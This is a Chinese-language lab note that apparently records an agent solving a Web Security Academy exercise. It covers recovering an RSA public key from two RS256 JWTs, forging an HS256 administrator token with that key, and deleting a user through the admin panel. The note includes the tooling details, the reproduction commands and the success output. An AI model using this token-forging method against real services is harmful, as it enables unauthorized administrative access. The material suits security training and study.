---
title: "lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key"
links:
  - target: jwt-family
    relation: evidences
---

# lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key

> evidences: [[jwt-family]]

- 题面:JWT authentication bypass via algorithm confusion with no exposed key(/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)
- 实例:https://0ac30050033ab99c833b2e5900e10099.web-security-academy.net
- 判定目标:由两枚 RS256 令牌反推公钥 → 伪造 HS256 会话进 admin 删 carlos;状态:**solved**(批 33)

## 收官:纯 Rust 大整数换成 GMP

`jwt rsa-from-tokens` 原用 `num-bigint`:`s^65537` 得到 ~134M bit(16MB)整数再大数 `gcd` → 分钟级。
现改为 **GMP 快速路径**:`jwt.rs` 先算 `(s_i, EM_i)` 字节,写出内置 C 源并用 `gcc -O2 -lgmp`
按需编译到 `$TMPDIR/pi-rs-rsa2n/rsa2n`,由它 `mpz_pow_ui(gcd)` —— 22~35s 完成;**纯 Rust 仅作回退**。
本机已具备 `gcc` + `libgmp.so`(无 gmpy2,故不走 python)。

## 两个实测坑

1. **阶数偏差**:首次 gcd 出来是 **2049 bit** = `2n`(两个 residual 都含因子 2)。RSA 模数必为奇数且两因子极大,
   故 gcd 的任何小因子都是余因子伪影 —— 件中加 `strip_small_factors`(试除 2..=65536),得到干净的 2048 bit `n`。
2. **PEM 格式**:`spki_pem`(BEGIN PUBLIC KEY,64 列,尾换行)作为 HS256 密钥**直接可用**,`kid` 沿用原令牌。

## 复现命令(全件化,无 python/bash 通道)

```
# 两次登录取两枚 RS256 令牌
lab_http get  "<inst>/login" ...; lab_http post "<inst>/login" --form csrf=.. --form username=wiener --form password=peter
jwt rsa-from-tokens <t1> <t2> --out /tmp/pub.pem      # GMP 路径,22~35s
jwt sign /tmp/pub.pem administrator --kid <kid-from-token> --out /tmp/token
# 以 Cookie: session=<token> 打 /admin → 200 管理面板
lab_http get "<inst>/admin/delete?username=carlos" --jar <含伪造 token 的 jar>
```

## 证据摘录

```
jwt rsa-from-tokens -> {"bits":2048,"pem":"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqh..."}
jwt sign -> eyJhbGciOiJIUzI1NiIsImtpZCI6IjRkMDA1YTZhLWNlNTAtNDg3Yi1iMDQwLWQ4MzdlMGZlMGNjNyIsInR5cCI6IkpXVCJ9...
GET /admin (伪造 token) -> 200,Users: wiener/carlos,Delete 链接
GET /admin/delete?username=carlos -> 302
solved_check -> {"congrats_line":"...you solved the lab!","solved":true}
```
